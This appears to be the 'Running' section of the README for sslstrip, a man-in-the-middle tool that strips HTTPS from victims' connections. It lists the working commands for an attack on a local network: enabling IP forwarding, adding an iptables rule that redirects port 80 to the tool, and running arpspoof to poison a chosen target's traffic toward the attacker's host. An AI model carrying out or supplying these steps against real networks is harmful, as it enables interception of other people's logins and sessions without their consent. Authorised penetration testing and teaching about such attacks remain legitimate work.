## Running

`sslstrip` can be run from the source base without installation.

### Running as normal user

To run as a normal user to see options:

`python3 sslstrip.py -h`

### Running as root user

1. Enable IP forwarding:

`echo "1" > /proc/sys/net/ipv4/ip_forward`

2. Setup `iptables` to intercept HTTP requests:

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <your listen port>`

3. Run `sslstrip` with the options you prefer.

4. Run `arpspoof` to redirect traffic to your host:

`arpspoof -i <your network interface> -t <target IP> <routers IP>`
